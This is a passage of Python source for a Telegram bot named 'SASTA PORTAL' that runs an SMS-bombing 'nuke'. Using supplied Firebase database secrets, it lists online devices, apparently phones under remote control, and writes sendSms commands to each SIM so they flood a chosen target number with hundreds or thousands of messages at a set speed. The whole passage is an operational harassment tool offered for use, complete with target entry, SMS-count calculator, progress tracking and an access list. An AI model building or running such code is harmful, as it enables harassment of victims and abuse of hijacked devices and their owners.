            f"✅ Speed: `{s.nuke_speed_label}`", reply_markup=kb_main(uid), parse_mode="Markdown"
        )
        return

    # ── START NUKE ─────────────────────────────────
    if d == "start_nuke":
        if not s.firebase_configs:
            await q.answer("No configs", show_alert=True)
            return
        if not s.target_number:
            await q.answer("Set target first", show_alert=True)
            return

        await q.edit_message_text("⏳ Gathering devices...", parse_mode="Markdown")
        all_devices = []
        for n, c in s.firebase_configs.items():
            try:
                await fetch_devices(c)
            except Exception:
                continue
            for did, dv in c.unique_devices.items():
                if dv.get("status"):
                    all_devices.append((did, (n, dv)))

        if not all_devices:
            await q.edit_message_text(
                "❌ No online devices.",
                reply_markup=kb_main(uid),
                parse_mode="Markdown",
            )
            return

        s.pending_devices = all_devices
        online_cnt = len(all_devices)

        if s.one_shot:
            if s.message_mode == "custom_single":
                s.sms_limit = online_cnt
                label = "Single SMS (one-shot)"
            else:
                s.sms_limit = online_cnt * s.custom_message_count
                label = f"{s.custom_message_count} Custom (one-shot)"
            await q.edit_message_text(
                f"🚀 *Ready*\n\n"
                f"📱 Online: `{online_cnt}`\n"
                f"💬 `{label}`\n"
                f"📩 SMS: `{s.sms_limit}`\n"
                f"⚡ `{s.nuke_speed_label}`\n\n"
                f"⚠️ One-shot: sends then STOPS.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("💣 Fire Nuke", callback_data="fire_now")],
                    [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
                ]),
                parse_mode="Markdown",
            )
            return

        s.max_sms_capacity = online_cnt * 100
        s.step = "sms_count"
        await q.edit_message_text(
            f"📊 *SMS Calculator*\n\n"
            f"🟢 Online: `{online_cnt}`\n"
            f"📱 Max/Device: `100`\n"
            f"━━━━━━━━━━━━\n"
            f"📩 Max SMS: `{s.max_sms_capacity:,}`\n\n"
            f"How many to send?",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(f"📩 Max ({s.max_sms_capacity:,})", callback_data="smscount_max")],
                [InlineKeyboardButton("🎯 100", callback_data="smscount_100")],
                [InlineKeyboardButton("🎯 500", callback_data="smscount_500")],
                [InlineKeyboardButton("🎯 1000", callback_data="smscount_1000")],
                [InlineKeyboardButton("✏️ Custom", callback_data="smscount_custom")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
            ]),
            parse_mode="Markdown",
        )
        return

    if d.startswith("smscount_"):
        key = d.replace("smscount_", "")
        if key == "custom":
            s.step = "sms_count_input"
            await q.edit_message_text(
                f"✏️ Max: `{s.max_sms_capacity:,}`\n\nEnter a number:",
                reply_markup=kb_cancel(),
                parse_mode="Markdown",
            )
            return
        if key == "max":
            s.sms_limit = s.max_sms_capacity
        else:
            s.sms_limit = int(key)
        await q.edit_message_text(
            f"✅ Limit: `{s.sms_limit:,}`\n\nPress 💣 Fire Now.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💣 Fire Now", callback_data="fire_now")],
                [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
            ]),
            parse_mode="Markdown",
        )
        return

    if d == "fire_now":
        await begin_nuke(q, s)
        return

    if d == "stop_nuke":
        if not s.is_nuking:
            await q.answer("No nuke running", show_alert=True)
            return
        s.is_nuking = False
        await q.edit_message_text(
            "⏹ Stopping...", reply_markup=kb_main(uid), parse_mode="Markdown"
        )
        return

    if d == "check_status":
        total = sum(len(c.unique_devices) for c in s.firebase_configs.values())
        await q.edit_message_text(
            f"📊 *Status*\n\n"
            f"🔥 Firebase: `{len(s.firebase_configs)}`\n"
            f"📱 Devices: `{total}`\n"
            f"🎯 Target: `{s.target_number or 'Not set'}`\n"
            f"💬 Mode: `{s.message_mode}`\n"
            f"⚡ `{s.nuke_speed_label}`\n"
            f"📩 Limit: `{s.sms_limit:,}`\n"
            f"💥 Nuke: `{'🟢 ON' if s.is_nuking else '🔴 OFF'}`\n"
            f"✅ Sent: `{s.nuke_stats['sent']:,}`\n"
            f"❌ Failed: `{s.nuke_stats['failed']:,}`",
            reply_markup=kb_main(uid),
            parse_mode="Markdown",
        )
        return


# ═══════════════════════════════════════════════════════════
# MESSAGE HANDLER
# ═══════════════════════════════════════════════════════════

@authorized_only
@rate_limit(120)
async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    s = user_sessions.setdefault(uid, UserSession(uid))
    s.last_activity = datetime.now()
    text = (update.message.text or "").strip()

    if not text:
        return

    # ── TRUSTED ADD ────────────────────────────────
    if s.step == "trusted_add_id":
        if uid != ADMIN_ID:
            s.step = "start"
            await update.message.reply_text("🚫 Admin only.", reply_markup=kb_main(uid))
            return

        parts = text.split(maxsplit=1)
        raw_id = parts[0].strip()
        name = parts[1].strip() if len(parts) > 1 else "Unknown"

        if not raw_id.lstrip("-").isdigit():
            await update.message.reply_text(
                "❌ *Invalid Chat ID*\n\nExample: `6761752864`",
                reply_markup=kb_cancel(),
                parse_mode="Markdown",
            )
            return

        target_id = int(raw_id)

        if target_id == ADMIN_ID:
            await update.message.reply_text(
                "ℹ️ That's your ID.",
                reply_markup=kb_main(uid),
                parse_mode="Markdown",
            )
            s.step = "start"
            return

        trusted = load_trusted()
        if str(target_id) in trusted:
            await update.message.reply_text(
                f"⚠️ `{target_id}` already trusted.",
                reply_markup=kb_trusted_menu(),
                parse_mode="Markdown",
            )
            s.step = "start"
            return

        try:
            chat = await context.bot.get_chat(target_id)
            fetched = chat.first_name or chat.username or name
            if chat.username:
                fetched += f" (@{chat.username})"
            name = fetched
        except Exception:
            pass

        if add_trusted(target_id, name, added_by=uid):
            try:
                await context.bot.send_message(
                    chat_id=target_id,
                    text=(
                        "🎉 *Access Granted!*\n\n"
                        "You're now a trusted user of SASTA PORTAL.\n\n"
                        "Send /start to begin.",
                    ),
                    parse_mode="Markdown",
                )
                notified = True
            except Exception:
                notified = False

            note = "" if notified else "\n\n_⚠️ User must start the bot first._"
            await update.message.reply_text(
                f"✅ *Added*\n\n"
                f"👤 `{name}`\n"
                f"🆔 `{target_id}`\n"
                f"📊 Trusted: `{len(load_trusted())}`{note}",
                reply_markup=kb_trusted_menu(),
                parse_mode="Markdown",
            )
        else:
            await update.message.reply_text("❌ Failed.", reply_markup=kb_trusted_menu())
        s.step = "start"
        return

    # ── FB NAME ────────────────────────────────────
    if s.step == "fb_name":
        if text in s.firebase_configs:
            await update.message.reply_text("❌ Name exists:", reply_markup=kb_cancel())
            return
        s.temp_config["name"] = text
        s.step = "fb_url"
        await update.message.reply_text(
            f"🔗 *Step 2/3:* URL for `{text}`\n\nExample: `https://project.firebaseio.com`",
            reply_markup=kb_cancel(),
            parse_mode="Markdown",
        )
        return

    if s.step == "fb_url":
        if not text.startswith("http") or not (
            "firebaseio.com" in text or "firebasedatabase.app" in text
        ):
            await update.message.reply_text(
                "❌ Invalid URL.",
                reply_markup=kb_cancel(),
            )
            return
        s.temp_config["url"] = text
        s.step = "fb_key"
        await update.message.reply_text(
            "🔑 *Step 3/3:* Database Secret Key\n\n"
            "⚠️ Firebase Console → Project Settings → Service Accounts → Database Secrets\n\n"
            "❌ Not the API key (`AIza...`)",
            reply_markup=kb_cancel(),
            parse_mode="Markdown",
        )
        return

    if s.step == "fb_key":
        name = s.temp_config.get("name")
        url = s.temp_config.get("url")
        await update.message.reply_text("⏳ Testing...")
        try:
            await fb_get(url, text, "clients")
        except PermissionError:
            await update.message.reply_text(
                "❌ *PERMISSION_DENIED*\n\nUse Database Secret Key, not API key.",
                reply_markup=kb_cancel(),
                parse_mode="Markdown",
            )
            return
        except Exception as e:
            await update.message.reply_text(f"❌ `{e}`", reply_markup=kb_cancel(), parse_mode="Markdown")
            return

        cfg = FirebaseConfig(name, url, text)
        try:
            await fetch_devices(cfg)
        except Exception:
            pass
        s.firebase_configs[name] = cfg
        s.active_config = name
        s.temp_config = {}
        s.step = "start"
        await update.message.reply_text(
            f"✅ *Connected!*\n\n"
            f"📱 `{name}`\n"
            f"🟢 {cfg.unique_online} | 🔴 {cfg.unique_offline}\n"
            f"Total: `{len(s.firebase_configs)}`",
            reply_markup=kb_main(uid),
            parse_mode="Markdown",
        )
        return

    # ── TARGET ─────────────────────────────────────
    if s.step == "target":
        if not re.match(r"^\+?[1-9]\d{9,14}$", text):
            await update.message.reply_text(
                "❌ Invalid. Example: `+919876543210`",
                reply_markup=kb_cancel(),
                parse_mode="Markdown",
            )
            return
        s.target_number = text
        s.step = "start"
        await update.message.reply_text(
            f"✅ Target: `{text}`", reply_markup=kb_main(uid), parse_mode="Markdown"
        )
        return

    # ── CUSTOM SINGLE ──────────────────────────────
    if s.step == "custom_single_msg":
        s.custom_messages = [text]
        s.custom_message = text
        s.step = "start"
        preview = apply_placeholders(text)
        await update.message.reply_text(
            f"✅ Saved\n\n📝 `{text}`\n🔍 `{preview}`",
            reply_markup=kb_main(uid),
            parse_mode="Markdown",
        )
        return

    # ── CUSTOM MULTI ───────────────────────────────
    if s.step == "custom_multi_msg":
        s.custom_messages.append(text)
        idx = len(s.custom_messages)
        total = s.custom_message_count
        if idx >= total:
            s.custom_message = s.custom_messages[0]
            s.step = "start"
            lines = [f"{i+1}. `{m[:60]}`" for i, m in enumerate(s.custom_messages)]
            await update.message.reply_text(
                f"✅ *All {total} saved!*\n\n" + "\n".join(lines),
                reply_markup=kb_main(uid),
                parse_mode="Markdown",
            )
        else:
            await update.message.reply_text(
                f"✅ {idx}/{total}\n\nSend message {idx+1} of {total}:",
                reply_markup=kb_cancel(),
                parse_mode="Markdown",
            )
        return

    # ── SMS COUNT ──────────────────────────────────
    if s.step == "sms_count_input":
        if text.lower() == "max":
            s.sms_limit = s.max_sms_capacity
        else:
            try:
                n = int(text.replace(",", "").replace(" ", ""))
                if n < 1 or n > s.max_sms_capacity:
                    raise ValueError
                s.sms_limit = n
            except ValueError:
                await update.message.reply_text(
                    f"❌ 1 - {s.max_sms_capacity:,} or `max`",
                    reply_markup=kb_cancel(),
                    parse_mode="Markdown",
                )
                return
        s.step = "start"
        await update.message.reply_text(
            f"✅ Limit: `{s.sms_limit:,}`\nPress 💣 Fire Now.",
            reply_markup=kb_main(uid),
            parse_mode="Markdown",
        )
        return

    await update.message.reply_text(
        "❓ Use /start", reply_markup=kb_main(uid), parse_mode="Markdown"
    )


# ═══════════════════════════════════════════════════════════
# NUKE ENGINE
# ═══════════════════════════════════════════════════════════

async def begin_nuke(q, s: UserSession):
    if s.is_nuking:
        await q.answer("Already running", show_alert=True)
        return
    if not s.sms_limit:
        await q.answer("Set SMS count first", show_alert=True)
        return

    s.is_nuking = True
    s.nuke_stats = {"sent": 0, "failed": 0}

    await q.edit_message_text(
        f"💣 *Nuke Started*\n\n"
        f"📱 {len(s.pending_devices)} devices\n"
        f"📩 {s.sms_limit:,} SMS\n"
        f"💬 {s.message_mode}\n"
        f"⚡ {s.nuke_speed_label}",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("⏹ Stop", callback_data="stop_nuke")],
        ]),
        parse_mode="Markdown",
    )
    asyncio.create_task(nuke_loop(q, s))


async def nuke_loop(q, s: UserSession):
    total_sent = 0
    try:
        if s.one_shot:
            for did, (cname, dev) in s.pending_devices:
                if not s.is_nuking:
                    break
                cfg = s.firebase_configs.get(cname)
                if not cfg:
                    continue
                sims = get_device_sims(dev)
                if s.message_mode == "custom_single":
                    msgs = [apply_placeholders(s.custom_messages[0])] if s.custom_messages else ["Test"]
                else:
                    msgs = [apply_placeholders(m) for m in s.custom_messages]

                for msg in msgs:
                    if not s.is_nuking:
                        break
                    for slot in sims:
                        if not s.is_nuking:
                            break
                        ok = await fb_set(
                            cfg.url, cfg.key,
                            f"clients/{did}/webhookEvent/sendSms",
                            {"from": slot, "to": s.target_number,
                             "message": msg, "isSended": False},
                        )
                        s.nuke_stats["sent" if ok else "failed"] += 1
                await asyncio.sleep(min(s.nuke_speed, 1.0))

            s.is_nuking = False
            await send_summary(q, s, one_shot=True)
            return

        counter = 0
        while s.is_nuking and total_sent < s.sms_limit:
            msg = build_random_msg()
            for did, (cname, dev) in s.pending_devices:
                if not s.is_nuking or total_sent >= s.sms_limit:
                    break
                cfg = s.firebase_configs.get(cname)
                if not cfg:
                    continue
                sims = get_device_sims(dev)
                for slot in sims:
                    if total_sent >= s.sms_limit or not s.is_nuking:
                        break
                    ok = await fb_set(
                        cfg.url, cfg.key,
                        f"clients/{did}/webhookEvent/sendSms",
                        {"from": slot, "to": s.target_number,
                         "message": msg, "isSended": False},
                    )
                    if ok:
                        s.nuke_stats["sent"] += 1
                        total_sent += 1
                    else:
                        s.nuke_stats["failed"] += 1

            counter += 1
            if counter % 5 == 0:
                await update_progress(q, s, total_sent)
            await asyncio.sleep(s.nuke_speed)

        s.is_nuking = False
        await send_summary(q, s, one_shot=False)

    except Exception as e:
        logger.exception("Nuke error")
        s.is_nuking = False
        try:
            await q.message.reply_text(f"❌ Nuke error: `{e}`", parse_mode="Markdown")
        except Exception:
            pass


async def update_progress(q, s, sent):
    pct = (sent / s.sms_limit * 100) if s.sms_limit else 0
    try:
        await q.edit_message_text(
            f"💣 *Running*\n\n"
            f"📱 Devices: `{len(s.pending_devices)}`\n"
            f"⚡ `{s.nuke_speed_label}`\n\n"
            f"✅ Sent: `{s.nuke_stats['sent']:,}`\n"
            f"🎯 Target: `{s.sms_limit:,}`\n"
            f"⏳ Left: `{s.sms_limit - sent:,}`\n"
            f"📈 `{pct:.1f}%`\n"
            f"❌ Failed: `{s.nuke_stats['failed']}`",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⏹ Stop", callback_data="stop_nuke")],
            ]),
            parse_mode="Markdown",
        )
    except Exception:
        pass


async def send_summary(q, s, one_shot):
    title = "✅ *One-Shot Complete*" if one_shot else "✅ *Nuke Complete*"
    try:
        await q.edit_message_text(
            f"{title}\n\n"
            f"✅ Sent: `{s.nuke_stats['sent']:,}`\n"
            f"❌ Failed: `{s.nuke_stats['failed']:,}`\n"
            f"🎯 Target: `{s.target_number}`\n"
            f"💬 Mode: `{s.message_mode}`\n"
            f"⚡ `{s.nuke_speed_label}`",
            reply_markup=kb_main(q.from_user.id),
            parse_mode="Markdown",
        )
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════

def main():
    keep_alive()

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_start))
    app.add_handler(CommandHandler("id", cmd_id))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_message))

    logger.info("🔥 SASTA PORTAL bot starting...")
    logger.info(f"👑 Admin ID: {ADMIN_ID}")
    logger.info(f"👥 Trusted users: {len(load_trusted())}")

    app.run_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True,
    )


if __name__ == "__main__":
    main()